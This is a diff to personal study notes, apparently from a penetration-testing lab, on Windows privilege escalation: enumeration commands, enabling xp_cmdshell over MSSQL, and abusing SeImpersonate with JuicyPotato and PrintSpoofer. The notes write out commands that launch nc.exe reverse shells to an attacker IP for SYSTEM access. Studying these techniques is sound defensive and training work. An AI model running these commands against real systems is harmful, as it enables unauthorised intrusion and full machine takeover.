@@ -86,3 +86,54 @@ and to have further info about a specific group and its users
 ```cmd-session
 net localgroup administrators
 ```
+to finish it's worth checking for password policies and account information
+```cmd-session
+net accounts
+```
+
+some cheat- sheets for instance payload all things for an exhaustive list [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+Named pipes, well i know what they are, not gonna explain them (sorry readers), but still can look them up [Named Pipes](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipes)
+Listing named pipes list
+```cmd-session
+pipelist.exe /accepteula
+```
+
+reviewing a specific named pipe
+```cmd-session
+accesschk.exe /accepteula \\.\Pipe\lsass -v
+accesschk.exe -accepteula -w \pipe\WindscribeService -v
+```
+
+## Windows user privileges
+### SeImpersonate Example - JuicyPotato
+
+connect to mssql with  MSSQLClient.py example, in other to escalate privileges with set Impersonate:
+```shell-session
+mssqlclient.py sql_dev@10.129.43.30 -windows-auth
+```
+Once connected we need to enable cmd shell
+```shell-session
+SQL> enable_xp_cmdshell
+```
+now we can execute cmd sessions.
+```shell-session
+xp_cmdshell whoami /priv
+
+```
+
+> [!info]
+Note: We don't actually have to type `RECONFIGURE` as Impacket does this for us.
+
+if we ever found ```SeImpersonatePrivilege``` is found, it can be used to impersonate a privileged account such as `NT AUTHORITY\SYSTEM`
+We can use  [JuicyPotato](https://github.com/ohpe/juicy-potato) to exploit the `SeImpersonate` or `SeAssignPrimaryToken` privileges via DCOM/NTLM reflection abuse.
+example:
+```shell-session
+xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
+```
+JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access
+
+```shell-session
+xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
+```
+### SeDebugPrivilege
+To run a particular application or service or assist with troubleshooting, a user might be assigned the [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) instead of adding the account into the administrators group. This privilege can be assigned via local or domain group policy, under `Computer Settings > Windows Settings > Security Settings`. By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures.
